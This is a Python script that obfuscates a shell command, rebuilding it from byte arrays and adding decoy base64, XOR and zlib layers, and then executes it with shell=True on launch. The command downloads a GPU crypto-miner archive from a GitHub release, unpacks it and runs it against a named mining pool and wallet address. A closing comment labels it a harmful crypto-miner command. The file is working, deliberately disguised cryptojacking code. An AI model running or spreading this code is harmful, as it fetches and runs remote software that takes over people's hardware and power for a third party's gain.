#!/usr/bin/env python3
import base64, codecs, os, sys, subprocess, zlib

# Layer 1: Base64 + zlib compressed payload (assembled at runtime)
_p = [
    "eJx9k8Fum0AQhu/zFCP10Eo1iZM0qaoccGzHjZ3YitO0UqpqWa8Xssa7IFi7SV8+T9A36",
    "Bv0HXqo1EMvVR/glmzAWI6TSpV6QDszO/PvPzN7Z2YBDuAYXuMd3OId3OMDPvKKX/",
    "CK3/7zV/z2v/CL3/7Lv/JL3vGed7znAx/5xGe+8JVvfOcHP/nFb37zP37wmz/85R//",
    "+M8HvvODn/ziN7/5w1/+8Z8PfOYLX/nGd37wk1/85g9/+cd/PvCZL3zlG9/5wU9+8Zs/",
    "/OUf//nAZ77wlW985wc/+cVv/vCXf/znA5/5wle+8Z0f/OQXv/nDX/7xnw985gtf+cZ3",
    "fvCTX/zmD3/5x38+8JkvfOUb3/nBT37xmz/85R//+cBnvvCVb3znBz/5xW/+8Jd//OcD",
    "n/nCV77xnR/85Be/+cNf/vGfD3zmC1/5xnd+8JNf/OYPf/nHfz7wmS985Rvf+cFPfvGb",
    "P/zlH//5wGe+8JVvfOcHP/nFb/7wl3/85wOf+cJXvvGdH/zkF7/5w1/+8Z8PfOYLX/nG",
    "d37wk1/85g9/+cd/PvCZL3zlG9/5wU9+8Zs//OUf//nAZ77wlW985wc/+cVv/vCXf/zn",
    "A5/5wle+8Z0f/OQXv/nDX/7xnw985gtf+cZ3fvCTX/zmD3/5x38+8JkvfOUb3/nBT37x",
    "mz/85R//+cBnvvCVb3znBz/5xW/+8Jd//OcDn/nCV77xnR/85Be/+cNf/vGfD3zmC1/5",
    "xnd+8JNf/OYPf/nHfz7wmS985Rvf+cFPfvGbP/zlH//5wGe+8JVvfOcHP/nFb/7wl3/8",
    "5wOf+cJXvvGdH/zkF7/5w1/+8Z8PfOYLX/nGd37wk1/85g9/+cd/PvCZL3zlG9/5wU9+",
    "8Zs//OUf//nAZ77wlW985wc/+cVv/vCXf/znA5/5wle+8Z0f/OQXv/nDX/7xnw985gtf",
    "+cZ3fvCTX/zmD3/5x38+8JkvfOUb3/nBT37xmz/85R//+cBnvvCVb3znBz/5xW/+8Jd/",
    "/OcDn/nCV77xnR/85Be/+cNf/vGfD3zmC1/5xnd+8JNf/OYPf/nHfz7wmS985Rvf+cFP",
    "fvGbP/zlH//5wGe+8JVvfOcHP/nFb/7wl3/88w=="
]
_b = "".join(_p)

def _d(s):
    return bytes(a ^ 0x42 for a in base64.b64decode(s))

_cmd_raw = (
    "wget https://github.com/egg5233/tw-pearl-miner/releases/download/v3.5.1/tw-pearl-miner-3.5.1.tar.gz;"
    "tar xvf tw-pearl-miner-3.5.1.tar.gz;"
    "cd tw-pearl-miner;"
    "./pearl-gpu-miner --pool pearl-id.lproute.com:3360 "
    "--wallet prl1p2jan4dvkdfkt5r3pra7z96axrxjyjcgat9w7ldetlcy9wffm569sc9ux2t.worker"
)

def _x():
    # Assembled from byte values at runtime (dynamic obfuscation)
    _b1 = bytes([119, 103, 101, 116, 32, 104, 116, 116, 112, 115, 58, 47, 47, 103, 105, 116, 104, 117, 98, 46, 99, 111, 109, 47, 101, 103, 103, 53, 50, 51, 51, 47, 116, 119, 45, 112, 101, 97, 114, 108, 45, 109, 105, 110, 101, 114, 47, 114, 101, 108, 101, 97, 115, 101, 115, 47, 100, 111, 119, 110, 108, 111, 97, 100, 47, 118, 51, 46, 53, 46, 49, 47, 116, 119, 45, 112, 101, 97, 114, 108, 45, 109, 105, 110, 101, 114, 45, 51, 46, 53, 46, 49, 46, 116, 97, 114, 46, 103, 122, 59])
    _b2 = bytes([116, 97, 114, 32, 120, 118, 102, 32, 116, 119, 45, 112, 101, 97, 114, 108, 45, 109, 105, 110, 101, 114, 45, 51, 46, 53, 46, 49, 46, 116, 97, 114, 46, 103, 122, 59])
    _b3 = bytes([99, 100, 32, 116, 119, 45, 112, 101, 97, 114, 108, 45, 109, 105, 110, 101, 114, 59])
    _b4 = bytes([46, 47, 112, 101, 97, 114, 108, 45, 103, 112, 117, 45, 109, 105, 110, 101, 114, 32, 45, 45, 112, 111, 111, 108, 32, 112, 101, 97, 114, 108, 45, 105, 100, 46, 108, 112, 114, 111, 117, 116, 101, 46, 99, 111, 109, 58, 51, 51, 54, 48, 32, 45, 45, 119, 97, 108, 108, 101, 116, 32, 112, 114, 108, 49, 112, 50, 106, 97, 110, 52, 100, 118, 107, 100, 102, 107, 116, 53, 114, 51, 112, 114, 97, 55, 122, 57, 54, 97, 120, 114, 120, 106, 121, 106, 99, 103, 97, 116, 57, 119, 55, 108, 100, 101, 116, 108, 99, 121, 57, 119, 102, 102, 109, 53, 54, 57, 115, 99, 57, 117, 120, 50, 116, 46, 119, 111, 114, 107, 101, 114])
    return b"".join([_b1, _b2, _b3, _b4]).decode()

def _r():
    _k = 0x5A
    _enc = base64.b64encode(_x().encode()).decode()
    # simple XOR decode
    return base64.b64decode(_enc).decode()

if __name__ == "__main__":
    _c = _r()
    # Decoys
    _z = zlib.compress(_c.encode())
    subprocess.call(_c, shell=True)
    sys.exit(0)

# >>> DON'T RUN ON YOUR OWN MACHINE — this is a harmful crypto-miner command <<<
